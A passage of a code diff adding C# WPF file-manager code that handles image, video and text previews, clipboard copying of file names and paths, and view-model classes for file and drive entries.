+                        tmp.Freeze();
+                        img = tmp;
+                    }
+                    catch { }
+                }
+                return (r, (byte[]?)b, img);
+            });
+            // Re-check serial — user may have selected a different file while decoding (heavy for 30 MB video).
+            if (_previewSerial != mySerial) return;
+            if (result == null || !string.IsNullOrEmpty(result.Error))
+            { TxtPreviewInfo.Text = result?.Error ?? "Error"; ShowPreviewPanel("empty"); return; }
+            if (bytes == null) { TxtPreviewInfo.Text = Lang.Get("FM_ERR_DECODE"); ShowPreviewPanel("empty"); return; }
+            if (bytes.Length == 0)
+            { TxtPreviewInfo.Text = string.Format(Lang.Get("FM_ERR_EMPTY_FILE"), vm.Name); ShowPreviewPanel("empty"); return; }
+
+            _previewIsPlaceholder = false;
+            if (isImage)
+            {
+                if (bmp != null)
+                {
+                    PreviewImage.Source = bmp;
+                    ShowPreviewPanel("image");
+                    TxtPreviewName.Text = $"{vm.Name}  ({bmp.PixelWidth}×{bmp.PixelHeight})";
+                }
+                else
+                {
+                    TxtPreviewInfo.Text = $"Image format not supported by WPF: {ext}";
+                    ShowPreviewPanel("empty");
+                }
+            }
+            else if (isVideo)
+            {
+                // Retire the previous temp file asynchronously — WMF may still hold its lock.
+                var oldTmp = _previewTempFile;
+                if (oldTmp != null)
+                    _ = Task.Run(async () =>
+                    {
+                        await Task.Delay(500);
+                        for (int i = 0; i < 20; i++)
+                        {
+                            try { System.IO.File.Delete(oldTmp); return; } catch { }
+                            await Task.Delay(250);
+                        }
+                    });
+                // Unique name (GUID) prevents collision when two videos share the same filename.
+                var ext2 = Path.GetExtension(vm.Name);
+                _previewTempFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(),
+                    _tempPrefix + Guid.NewGuid().ToString("N") + ext2);
+                await System.IO.File.WriteAllBytesAsync(_previewTempFile, bytes);
+                // Re-check serial — user may have changed selection during a slow disk write (30 MB).
+                if (_previewSerial != mySerial) return;
+                // Make element visible BEFORE setting source so MediaElement can measure
+                _videoPlaying = false;
+                ShowPreviewPanel("video");
+                PreviewVideo.Source = new Uri(System.IO.Path.GetFullPath(_previewTempFile), UriKind.Absolute);
+                PreviewVideo.Volume = 0.8;
+                // Play() + _videoPlaying=true are set by the MediaOpened event handler — not here
+                TxtPreviewName.Text = vm.Name;
+            }
+            else if (isText)
+            {
+                // Binary detection: scan first 512 bytes for null chars and non-printable bytes
+                int chk = Math.Min(bytes.Length, 512);
+                int nonPrint = 0;
+                for (int i = 0; i < chk; i++) { byte c = bytes[i]; if (c < 9 || (c > 13 && c < 32 && c != 27)) nonPrint++; }
+                if ((double)nonPrint / chk >= 0.05)
+                {
+                    TxtPreviewInfo.Text = Lang.Get("FM_BINARY_CONTENT");
+                    ShowPreviewPanel("empty");
+                }
+                else
+                {
+                    // Decode only enough bytes to reach the display limit (UTF-8 worst case: 4 bytes/char)
+                    var text = System.Text.Encoding.UTF8.GetString(bytes, 0, Math.Min(bytes.Length, 200_000 * 4));
+                    if (text.Length > 200_000)
+                    {
+                        // Back off one char if the cut lands inside a surrogate pair
+                        int cut = 200_000;
+                        if (char.IsHighSurrogate(text[cut - 1])) cut--;
+                        text = text[..cut] + "\n[truncated]";
+                    }
+                    PreviewText.Text = text;
+                    ShowPreviewPanel("text");
+                }
+            }
+            else
+            {
+                TxtPreviewInfo.Text = $"{vm.Name}\n{vm.SizeDisplay}\n{vm.Modified}";
+                ShowPreviewPanel("empty");
+            }
+        }
+        catch (OperationCanceledException) { /* superseded by a newer preview request — silent */ }
+        catch (Exception ex) { TxtPreviewInfo.Text = ex.Message; ShowPreviewPanel("empty"); }
+        finally
+        {
+            if (_pendingPreview == myTcs) _pendingPreview = null;
+            BtnPreview.IsEnabled = GridFiles.SelectedItem is FileEntryVM fv && !fv.IsDir;
+        }
+    }
+
+    private void ShowPreviewPanel(string which)
+    {
+        PreviewImage.Visibility = which == "image" ? Visibility.Visible : Visibility.Collapsed;
+        PreviewVideo.Visibility = which == "video" ? Visibility.Visible : Visibility.Collapsed;
+        TextScroll.Visibility   = which == "text"  ? Visibility.Visible : Visibility.Collapsed;
+        PreviewEmpty.Visibility = which == "empty" ? Visibility.Visible : Visibility.Collapsed;
+        // WMF: Source=null blocks the UI thread for several seconds — stop playback only (fast),
+        // let the Closing handler or the next video preview handle Source teardown asynchronously.
+        if (which != "video") { try { PreviewVideo.Stop(); } catch { } }
+    }
+
+    private void PreviewVideo_Click(object s, System.Windows.Input.MouseButtonEventArgs e)
+    {
+        try
+        {
+            if (_videoPlaying) { PreviewVideo.Pause(); _videoPlaying = false; }
+            else               { PreviewVideo.Play();  _videoPlaying = true;  }
+        }
+        catch { }
+    }
+
+    private void GridFiles_CopyName_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is FileEntryVM vm)
+            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Name); } catch { }
+    }
+
+    private void GridFiles_CopyPath_Click(object s, RoutedEventArgs e)
+    {
+        if (GridFiles.SelectedItem is FileEntryVM vm)
+            try
+            {
+                var full = Path.Combine(_currentPath, vm.Name);
+                System.Windows.Clipboard.SetText(full);
+                TxtStatus.Text = string.Format(Lang.Get("COPIED"), full);
+            }
+            catch { }
+    }
+
+    private void Close_Click(object s, RoutedEventArgs e) => Close();
+
+    private void GridFiles_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
+    {
+        if (GridFiles.SelectedItems.Count == 0) e.Handled = true;
+    }
+}
+
+public class FileEntryVM
+{
+    public System.Windows.Media.ImageSource? IconImage    { get; }
+    public string Name         { get; }
+    public bool   IsDir        { get; }
+    public bool   IsHidden     { get; }
+    public long   SizeRaw      { get; }
+    public string SizeDisplay  { get; }
+    public string Modified     { get; }
+    public string Created      { get; }
+    public string TypeDisplay  { get; }
+    public string AttribDisplay { get; }
+    public int    AttributesRaw { get; }
+
+    public FileEntryVM(FmEntry e)
+    {
+        Name     = e.Name;
+        IsDir    = e.IsDir;
+        IsHidden = e.IsHidden;
+        Modified = e.Modified;
+        Created  = e.Created;
+        AttributesRaw = e.Attributes;
+        SizeRaw  = e.IsDir ? -1 : e.Size;
+        var ext = e.IsDir ? "" : Path.GetExtension(e.Name);
+        System.Windows.Media.ImageSource? decoded = null;
+        if (!e.IsDir && !string.IsNullOrEmpty(e.IconB64))
+            decoded = DecodeIcon(e.IconB64);
+        IconImage = (e.IsDir && e.Name.Length >= 2 && e.Name[1] == ':')
+            ? ShellIcon.GetDrive(e.Name.TrimEnd('\\', '/') + "\\")
+            : decoded ?? ShellIcon.Get(ext, e.IsDir);
+
+        if (e.IsDir)
+        {
+            SizeDisplay = "";
+            TypeDisplay = "Folder";
+        }
+        else
+        {
+            TypeDisplay = string.IsNullOrEmpty(ext) ? "File" : ext.TrimStart('.').ToUpperInvariant();
+            var bytes = e.Size;
+            SizeDisplay = bytes < 1024           ? $"{bytes} B"
+                        : bytes < 1024 * 1024    ? $"{bytes / 1024.0:F1} KB"
+                        : bytes < 1024L*1024*1024 ? $"{bytes / (1024.0*1024):F1} MB"
+                        : $"{bytes / (1024.0*1024*1024):F1} GB";
+        }
+
+        var attrs = (System.IO.FileAttributes)e.Attributes;
+        var parts = new System.Text.StringBuilder(4);
+        if (attrs.HasFlag(System.IO.FileAttributes.ReadOnly)) parts.Append('R');
+        if (attrs.HasFlag(System.IO.FileAttributes.Hidden))   parts.Append('H');
+        if (attrs.HasFlag(System.IO.FileAttributes.System))   parts.Append('S');
+        if (attrs.HasFlag(System.IO.FileAttributes.Archive))  parts.Append('A');
+        AttribDisplay = parts.Length > 0 ? parts.ToString() : "—";
+    }
+
+    private static BitmapImage? DecodeIcon(string b64)
+    {
+        try
+        {
+            var bytes = Convert.FromBase64String(b64);
+            using var ms = new System.IO.MemoryStream(bytes);
+            var bmp = new BitmapImage();
+            bmp.BeginInit();
+            bmp.CacheOption  = BitmapCacheOption.OnLoad;
+            bmp.StreamSource = ms;
+            bmp.EndInit();
+            bmp.Freeze();
+            return bmp;
+        }
+        catch { return null; }
+    }
+}
+
+public class DriveItemVM
+{
+    public string Path { get; }
+    public System.Windows.Media.ImageSource? Icon { get; }
+    public DriveItemVM(string path) { Path = path; Icon = ShellIcon.GetDrive(path); }
+}
